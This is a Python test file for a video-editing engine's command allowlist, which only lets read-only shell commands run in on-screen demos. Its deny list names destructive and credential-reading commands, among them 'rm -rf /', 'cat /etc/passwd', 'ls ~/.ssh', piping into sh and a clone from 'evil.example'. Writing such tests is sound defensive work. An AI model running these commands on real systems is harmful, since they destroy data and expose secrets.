"""2026-11-13 (owner): real runs on screen; only read-only command forms ever run."""
from golide_engine.edit import demos, editor
from golide_engine.edit.compose import Composer

from test_edit_editor import _lines


def test_only_read_only_forms_are_allowed():
    ok = ["git clone --depth 1 https://github.com/morluto/rea", "ls rea", "ls -la rea/src", "head -n 12 rea/README.md",
          "cat rea/LICENSE", "grep -n agent rea/README.md", "find rea -maxdepth 2 -type f", "pip install httpx",
          "npx --yes create-vite --help", 'ai gpt-5-mini "What is 2+2?"', "httpx --version"]
    bad = ["rm -rf /", "git clone https://evil.example/x", "cat /etc/passwd", "cat ../secret", "ls | sh",
           "curl https://x.y", "pip install x && rm -rf /", "head -n 9999 f", "bash -c ls", "echo $HOME",
           'ai claude-x "hi"', "python3 -c 'import os'", "sudo ls", "ls ~/.ssh"]
    assert all(demos.allowed(c) for c in ok), [c for c in ok if not demos.allowed(c)]
    assert not any(demos.allowed(c) for c in bad), [c for c in bad if demos.allowed(c)]


def test_refused_or_unknown_command_drops_the_demo():
    ran = demos.run([{"purpose": "nope", "commands": ["rm -rf /"], "highlight": ""},
                     {"purpose": "not installed", "commands": ["httpx --version"], "highlight": ""}])
    assert ran == []


def test_terminal_scene_from_a_real_run(tmp_path):
    run = {"purpose": "Cloning the toolkit", "highlight": "Reverse", "ok": True, "steps": [
        {"command": "ls rea", "seconds": 0.1, "ok": True, "lines": [{"t": 0.0, "text": "README.md"}]},
        {"command": "head -n 2 rea/README.md", "seconds": 0.1, "ok": True,
         "lines": [{"t": 0.0, "text": "# REA: Reverse Engineer Anything"}, {"t": 0.01, "text": "One MCP"}]}]}
    lines = _lines(["Here it is, cloned and read for real.", "That's the whole toolkit."])
    raw = {"scenes": [{"type": "terminal", "first_line": 0, "last_line": 1, "goli_corner": False, "poses": [],
                       "screen_words": None, "punch": None, "source": 0, "phrase": "Reverse Engineer", "items": [],
                       "shots": [], "quote": None, "label": None}]}
    edit = editor.build(raw, lines, 6.0, "long", [], None, [], [], demos=[run])
    term = next(s for s in edit["scenes"] if s["type"] == "terminal")
    assert term["data"]["mark"] == 3 and term["data"]["ok"]
    html = Composer("long").build(edit, tmp_path / "out").read_text()
    assert "real run" in html and "# REA: Reverse Engineer Anything" in html
